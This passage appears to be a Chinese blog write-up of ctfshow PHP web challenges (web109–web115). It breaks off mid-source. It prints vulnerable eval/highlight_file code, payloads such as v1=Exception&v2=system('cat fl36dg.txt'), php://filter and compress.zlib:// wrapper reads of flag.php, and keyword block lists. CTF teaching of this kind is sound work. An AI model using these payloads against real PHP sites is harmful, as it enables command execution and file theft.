important\">?></span></span></pre></td></tr></table></figure><p>这个很明显是考察原生类利用，这里可以查阅<a href=\"https://blog.xcu.icu/2022/11/02/php%E5%BA%8F%E5%88%97%E5%8C%96/\"> php 反序列化 - Web | Clown の Blog = (xcu.icu)</a> 我的这篇文章</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token keyword\">new</span> <span class=\"token variable\">$v1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里 echo 一个实例化的对象 v1，v2 是传入类中的参数，这里 v2 () 是表示会将 v2 返回值作为函数调用，这里有 echo 可以自动调用魔术方法__tostring () 方法，那么这里几个 php 反射类，和异常处理类等等都可以利用</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token path\">v1=Exception&amp;v2=system('cat</span> fl36dg.txt') v1=Reflectionclass&amp;v2=system('cat fl36dg.txt')</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token path\">v1=mysqli&amp;v2=system('tac</span> fl36dg.txt')</pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230113120837704.png\" alt=\"image-20230113120837704\" /></p>\n<h2 id=\"web110\"><a class=\"anchor\" href=\"#web110\">#</a> web110</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error v1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error v2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"echo new <span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span>(<span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>());\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这个题比起上一题加了一些过滤，上面的方法就不在使用，首先要查看文件明</p>\n<figure class=\"highlight txt\"><figcaption data-lang=\"txt\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>可遍历目录类有以下几个：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>DirectoryIterator 类</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>FilesystemIterator 类</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>GlobIterator 类</pre></td></tr></table></figure><p>但是这些都要传入路径，这里符号都被过滤，所以要使用别的函数来获取路径</p>\n<p>如果要获取脚本文件的目录，要应用函数 getcwd () 来实现。函数声明如下：</p>\n<p>string getcwd ( void ) ;</p>\n<p>成功执行后返回当前目录字符串，失败返回 FALSE。</p>\n<p>注： <code>这里三个遍历目录类，第一个包含隐藏文件，第二个不包含，第三个获取的是目录名，所以这里要使用第二个，当然这种方法也只能获取第一个文件名</code></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230113122221136.png\" alt=\"image-20230113122221136\" /></p>\n<p>访问即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230113122354782.png\" alt=\"image-20230113122354782\" /></p>\n<h1 id=\"中篇\"><a class=\"anchor\" href=\"#中篇\">#</a> 中篇</h1>\n<h2 id=\"web111\"><a class=\"anchor\" href=\"#web111\">#</a> web111</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$$v1</span></span> = &amp;<span class=\"token interpolation\"><span class=\"token variable\">$$v2</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$v1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\>/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error v1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\>/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error v2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ctfshow/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>本题的重点在</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$$v1</span></span> = &amp;<span class=\"token interpolation\"><span class=\"token variable\">$$v2</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$v1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>很明显考察变量覆盖，这里使用 GLOBALS 全局变量</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230113204217572.png\" alt=\"image-20230113204217572\" /></p>\n<h2 id=\"web112\"><a class=\"anchor\" href=\"#web112\">#</a> web112</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>   <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\.\\.\\/|http|https|data|input|rot13|base64|string/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里我们的目的是不能让 is_file 检测出是文件，并且 highlight_file 可以识别为文件。这时候可以利用 php 伪协议。<br />\n可以直接用不带任何过滤器的 filter 伪协议</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token scheme\">php<span class=\"token scheme-delimiter\">:</span></span><span class=\"token authority\"><span class=\"token authority-delimiter\">//</span><span class=\"token host\">filter</span></span><span class=\"token path\"><span class=\"token path-separator\">/</span>resource=flag.php</span></pre></td></tr></table></figure><p>这里主要是为了过滤编码方式，采用为被过滤的编码方式即可</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token scheme\">php<span class=\"token scheme-delimiter\">:</span></span><span class=\"token authority\"><span class=\"token authority-delimiter\">//</span><span class=\"token host\">filter</span></span><span class=\"token path\"><span class=\"token path-separator\">/</span>convert.iconv.UCS-2LE.UCS-2BE<span class=\"token path-separator\">/</span>resource=flag.php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token scheme\">php<span class=\"token scheme-delimiter\">:</span></span><span class=\"token authority\"><span class=\"token authority-delimiter\">//</span><span class=\"token host\">filter</span></span><span class=\"token path\"><span class=\"token path-separator\">/</span>read=convert.quoted-printable-encode<span class=\"token path-separator\">/</span>resource=flag.php</span></pre></td></tr></table></figure><p>或者使用别的伪协议</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token scheme\">compress.zlib<span class=\"token scheme-delimiter\">:</span></span><span class=\"token authority\"><span class=\"token authority-delimiter\">//</span><span class=\"token host\">flag.php</span></span></pre></td></tr></table></figure><p>这里对 zip 伪协议进行一个补充</p>\n<p><strong>【zip:// 协议】</strong></p>\n<p><strong>使用方法：</strong></p>\n<p>zip://archive.zip#dir/file.txt</p>\n<p>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p>\n<p><strong>2.【bzip2:// 协议】</strong></p>\n<p><strong>使用方法：</strong></p>\n<p>compress.bzip2://file.bz2</p>\n<p><strong>3.【zlib:// 协议】</strong></p>\n<p><strong>使用方法：</strong></p>\n<p>compress.zlib://file.gz</p>\n<h2 id=\"web113\"><a class=\"anchor\" href=\"#web113\">#</a> web113</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里没有过滤全，上面提到的 zilb:// 协议还能使用</p>\n<pre><code>/?file=compress.zlib://flag.php\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230214222732285.png\" alt=\"image-20230214222732285\" /></p>\n<p>或者利用 /proc/self/root 软链接，20 次软链接可以绕过 is_file ()</p>\n<h2 id=\"web114\"><a class=\"anchor\" href=\"#web114\">#</a> web114</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"师傅们居然tql都是非预期 哼！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span> 师傅们居然tql都是非预期 哼！</span></pre></td></tr></table></figure><p>这里过滤了 compress，root 但是又没有过滤 filter</p>\n<pre><code>?file=php://filter/resource=flag.php\n</code></pre>\n<h2 id=\"web115\"><a class=\"anchor\" href=\"#web115\">#</a> web115</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$num</span><span 